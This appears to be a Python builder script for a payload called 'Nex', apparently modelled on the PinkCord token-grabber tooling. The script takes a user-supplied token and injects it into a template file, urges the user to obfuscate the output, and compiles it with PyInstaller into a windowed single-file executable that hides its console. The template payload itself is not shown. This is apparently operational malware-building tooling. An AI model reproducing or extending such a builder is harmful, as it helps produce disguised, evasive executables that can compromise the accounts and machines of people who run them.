from colorama import init, Fore
import os
import platform
import time
import subprocess
from python_minifier import minify
from pathlib import Path
import shutil
import PyInstaller.__main__
import threading
import sys
init()

def slow_print(text, color=""):
    for char in text:
        print(color + char, end="", flush=True)
        time.sleep(0.02)
    print("")

def slow_input(text, color=""):
    for char in text:
        print(color + char, end="", flush=True)
        time.sleep(0.02)
    return input("")

OS = platform.uname().system
if OS == "Windows":
    cle = "cls"
elif OS == "Linux":
    cle = "clear"
os.system(cle)
asci = (Fore.RED + """
 __ _  ____  _  _ 
(  ( \\(  __)( \\/ )
/    / ) _)  )  ( 
\\_)__)(____)(_\\/_) 

""")

slow_print(asci)
time.sleep(0.5)
os.system(cle)
if OS == "Linux":
    OS = "Linux"
    slow_print("Detected OS: Linux")
elif OS == "Windows":
    OS = "Windows"
    slow_print("Detected OS: Windows")
time.sleep(0.5)
os.system(cle)
slow_print("Project inspired by: PinkCord")
time.sleep(0.5)
os.system(cle)
Token = slow_input(Fore.YELLOW + "Please Insert your token: ")
os.system(cle)
slow_print(Fore.RED + "Replacing the token in the file (Nex.py)")
with open("Templates/Nex.py", "r") as sc:
    content = sc.read()

content = content.replace("[TOKEN]", Token)

with open("Templates/Nex.py", "w") as sc:
    sc.write(content)
time.sleep(0.5)
os.system(cle)
slow_print(Fore.GREEN + "Replacement Complete!")
time.sleep(0.5)
os.system(cle)
yesno = slow_input(Fore.YELLOW + "Do you want to test the file by running it?(y/n)")
if yesno == "y":
    subprocess.Popen(['start', 'cmd', '/k', 'py', 'Templates/Nex.py'], shell=True)
    os.system(cle)
    slow_input(Fore.YELLOW + "Press Enter when the test is over")
elif yesno == "n":
    pass
os.system(cle)
en = slow_input("Do you want to obfuscate this this code(highly recommended, y/n): ")
if en == "y":
    src = Path("Templates/Nex.py")
    dst = Path("nex.py")
    code = src.read_text(encoding="utf-8")
    dst.write_text(minify(code, remove_literal_statements=True, preserve_globals=None), encoding="utf-8")
elif en == "n":
    shutil.copy("Templates/Nex.py", "nex.py")
os.system(cle)
e = slow_input(Fore.YELLOW + "(Last step) Do you want to convert this file into an exe file(y/n): ")
if e == "y":
    params = [
        '--onefile',
        '--windowed',
        "nex.py"
    ]
    PyInstaller.__main__.run(params)
elif e == "n":
    pass
os.system(cle)
slow_input(Fore.GREEN + "File created successfully, Press enter to continue.")
with open("Templates/Nex.py", "r") as sc:
    content = sc.read()

content = content.replace(Token, "[TOKEN]")

with open("Templates/Nex.py", "w") as sc:
    sc.write(content)
sys.exit()
